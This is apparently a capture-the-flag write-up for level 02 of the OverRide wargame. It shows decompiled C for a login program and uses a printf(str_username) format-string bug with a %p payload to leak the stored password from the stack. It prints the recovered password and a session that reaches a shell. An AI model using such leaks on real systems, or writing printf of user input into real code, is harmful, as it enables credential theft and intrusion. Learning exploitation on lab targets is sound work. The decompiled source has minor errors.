# Level 02

<h3>source.c</h3>

```console
int main() {
	char	str_username[112];    -> [rbp-0x70]
	char	str_file[48];         -> [rbp-0xa0]
	char	str_password[112];    -> [rbp-0x110]
	FILE	*fd;                  -> [rbp-0x8]
	size_t	read_size;          -> [rbp-0xc]

	memset(str_username, 48);
	memset(str_file, 20);
	memset(str_password, 48);
	if ((fd = fopen("/home/users/level03/.pass", "r")) == NULL) {
		fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
		exit(1);
	}
	read_size = fread(str_file, 1, 41, fd);
	str_file[strcspn(str_file, "\n")] = '\0';
	if (read_size != 41) {
		fwrite("ERROR: failed to read password file\n", 1, 24, stderr);
		fwrite("ERROR: failed to read password file\n", 1, 24, stderr);
		exit(1);
	}
	fclose(fd);
	puts("===== [ Secure Access System v1.0 ] =====""]");
	puts("/***************************************\\");
	puts("| You must login to access this system. |");
	puts("\\**************************************/");
	printf("--[ Username: ");
	fgets(str_username, 100, stdin);
	str_username[strcspn(str_username, "\n")] = '\0';
	printf("--[ Password: ");
	fgets(str_password, 100, stdin);
	str_password[strcspn(str_password, "\n")] = '\0';
  puts("*****************************************");
	if (strncmp(str_password, str_file, 41) != 0) {
		printf(str_username);
		puts(" does not have access!");
		exit(1);
	}
	else {
		printf("Greetings, %s!\n", buff);
		system("/bin/sh");
    return (0);
	}
}
```

<h3>Analysis</h3>

This is the first time we encounter a `64bits` program, the asm code looks abit difference but the principle will mostly remain the same

The program will read the password from the file and store it directly into `str_file`

Afterward, it will request for 2 input, which is `username` and `password`

If the password that we give to the program is the same as the one in the `.pass`, we could spawn a shell

But the reason we are hacking this program is because of we dont know the password!!

So there will be no way we could get the password right

What we could do here is that there is `printf(str_username)` which is vulnerable to `format string` attack,

With this we can potentially print the data inside the stack and try to reach the stack area of `str_file` which store the password info

<h3>Exploit</h3>

First we must find out what will be the `printf` arg offset that could reach the `str_file` memory area relative to `str_username`

Base on the asm code, we can see that `str_username` located at [rbp-0x70] and `str_file` is at [rbp-0xa0]

The stack should looks like this

```console
+--------------+       -> rsp [rbp-0x120]
| extra buffer |       -> unused location   size: 16,   0bytes from esp
+--------------+
| str_password |       -> rbp-0x110         size: 112,  16bytes from esp
+--------------+
|   str_file   |       -> rbp-0xa0          size: 48,   128bytes from esp
+--------------+ 
| str_username |       -> rbp-0x70          size: 112,  176bytes from esp
+--------------+ 
|  read_size   |       -> rbp-0xc           size: 8,    276bytes from esp
+--------------+ 
|      fd      |       -> rbp-0x8           size: 8,    280bytes from esp
+--------------+       -> rbp
```

Lets try to print a bunch of `%p` to look at the stack

```console
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaaaaa %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
--[ Password: bbbbbbbb
*****************************************
aaaaaaaa 0x7fffffffe4a0|(nil)|0x62|0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a|0x7fffffffe698|0x1f7ff9a08|0x6262626262626262|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x100000000|(nil)|0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)|0x6161616161616161|0x257c70257c702520| does not have access!
```

Great we have a bunch of content printed from the stack, lets match it with the the stack 

```console
+--------------+
| str_password |  -> (112/8=14)   [0x6262626262626262|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x100000000|(nil)]
+--------------+
|   str_file   |  -> (48/8=6)     [0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)]
+--------------+ 
| str_username |  -> (112/8=14)   [0x6161616161616161|0x257c70257c702520|...]
+--------------+ 
```

It seems we may potentially have the content for the `str_file`

`0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|`

Lets convert them to ascii to get the password, this website could help us easier http://www.unit-conversion.info/texttools/hexadecimal/#data

But before we convert it, we must rearrange the hex as this is little endian, so we need to reverse them base on the slot

`|4868373452506e75|51397361354a4145|58674e5743717a37|7358476e68354a35|4d394b6650673348|`

After converting from the website, this is the final result `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

Lets try it!

```console
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, test!
$ whoami
level03
```
